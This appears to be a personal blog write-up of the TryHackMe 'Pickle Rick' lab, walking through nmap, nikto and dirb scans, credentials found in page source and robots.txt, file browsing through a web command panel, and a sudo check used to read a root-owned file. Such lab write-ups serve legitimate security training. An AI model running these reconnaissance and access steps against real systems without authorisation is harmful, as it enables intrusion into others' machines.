---
layout: post
title:  "THM: Pickle Rick"
date:   2024-02-02 13:50:01 -0600
categories: TryHackMe
image: /assets/img/picklerick.png
---
## Bad moves
For some reason I forgot all my web enumeration skills.  This is the thing with keeping up with documentation and reviewing.  

I started with gobuster since I was coming off the uploadvulns room, but that proved fruitless.  

I eventually went to some of the write ups and had to go through the basic nmap, nikto and dirbuster.  This was my first time with dirbuster, so better learn this tool.

I spent so much time going through the Burp Suite modules that they didn't even use this tool, even though I am becoming more confident using it.  But it was pointless for this room

So I guess the formula would be:

nmap, nikto, dirbuster and gobuster (for directories)

```
nmap -A -sV 10.10.0.165

Starting Nmap 7.60 ( https://nmap.org ) at 2024-02-03 02:13 GMT
Nmap scan report for ip-10-10-0-165.eu-west-1.compute.internal (10.10.0.165)
Host is up (0.00069s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 83:3d:29:77:f2:f3:69:14:74:e0:cd:25:05:c1:bc:d0 (RSA)
|   256 b5:e1:fc:1b:8d:bb:31:6a:44:a6:96:7e:2c:7e:39:93 (ECDSA)
|_  256 12:32:79:4e:c3:a3:57:f4:4f:57:e1:ac:49:c6:e6:71 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:B1:43:0A:81:E9 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms ip-10-10-0-165.eu-west-1.compute.internal (10.10.0.165)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds

```
Now nikto
```
nikto -h 10.10.0.165
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.0.165
+ Target Hostname:    ip-10-10-0-165.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2024-02-03 02:14:21 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2024-02-03 02:14:31 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
robots.txt has something

and we have /login.php

Now dirbuster
```
dirb http://10.10.0.165

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb  3 02:14:54 2024
URL_BASE: http://10.10.0.165/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.0.165/ ----
==> DIRECTORY: http://10.10.0.165/assets/                                      
+ http://10.10.0.165/index.html (CODE:200|SIZE:1062)                           
+ http://10.10.0.165/robots.txt (CODE:200|SIZE:17)                             
+ http://10.10.0.165/server-status (CODE:403|SIZE:299)                         
                                                                               
---- Entering directory: http://10.10.0.165/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Feb  3 02:14:59 2024
DOWNLOADED: 4612 - FOUND: 3

```
Nothing from that, but good try

What's amazing was the speed of these.  Fast and great info

Navigate to the IP address and look at the source

```
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>

```
Well, we got the username

let's try the robots.txt file

```
Wubbalubbadubdub
```
looks like a password, lets go to login.php and try

and we're in!

We can use the Command Panel to get our first flag

```
ls -al
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```
http://10.10.0.165/Sup3rS3cretPickl3Ingred.txt

1st flag done!

```
http://10.10.0.165/clue.txt
Look around the file system for the other ingredient.
```
this suggest directory traversal

```
cd ../../../../; ls -al
total 88
drwxr-xr-x  23 root root  4096 Feb  3 02:12 .
drwxr-xr-x  23 root root  4096 Feb  3 02:12 ..
drwxr-xr-x   2 root root  4096 Nov 14  2018 bin
drwxr-xr-x   3 root root  4096 Nov 14  2018 boot
drwxr-xr-x  14 root root  3260 Feb  3 02:11 dev
drwxr-xr-x  94 root root  4096 Feb  3 02:12 etc
drwxr-xr-x   4 root root  4096 Feb 10  2019 home
lrwxrwxrwx   1 root root    30 Nov 14  2018 initrd.img -> boot/initrd.img-4.4.0-1072-aws
drwxr-xr-x  21 root root  4096 Feb 10  2019 lib
drwxr-xr-x   2 root root  4096 Nov 14  2018 lib64
drwx------   2 root root 16384 Nov 14  2018 lost+found
drwxr-xr-x   2 root root  4096 Nov 14  2018 media
drwxr-xr-x   2 root root  4096 Nov 14  2018 mnt
drwxr-xr-x   2 root root  4096 Nov 14  2018 opt
dr-xr-xr-x 136 root root     0 Feb  3 02:11 proc
drwx------   4 root root  4096 Feb 10  2019 root
drwxr-xr-x  25 root root   880 Feb  3 02:12 run
drwxr-xr-x   2 root root  4096 Nov 14  2018 sbin
drwxr-xr-x   5 root root  4096 Feb 10  2019 snap
drwxr-xr-x   2 root root  4096 Nov 14  2018 srv
dr-xr-xr-x  13 root root     0 Feb  3 02:11 sys
drwxrwxrwt   8 root root  4096 Feb  3 02:24 tmp
drwxr-xr-x  10 root root  4096 Nov 14  2018 usr
drwxr-xr-x  14 root root  4096 Feb 10  2019 var
lrwxrwxrwx   1 root root    27 Nov 14  2018 vmlinuz -> boot/vmlinuz-4.4.0-1072-aws

```
how about /home

```
cd /home; ls -al
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Feb  3 02:12 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
```
go to rick's home

```
cd /home/rick; ls -al
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```
cd /home/rick; less "second ingredients"

2nd flag done!

```
sudo -l
Matching Defaults entries for www-data on ip-10-10-0-165.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-0-165.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

I learned this is the TCM course, but forgot!

```
sudo ls /root
3rd.txt
snap
```
Now get the LAST FLAG!

```
sudo less /root/3rd.txt
```

DONE!
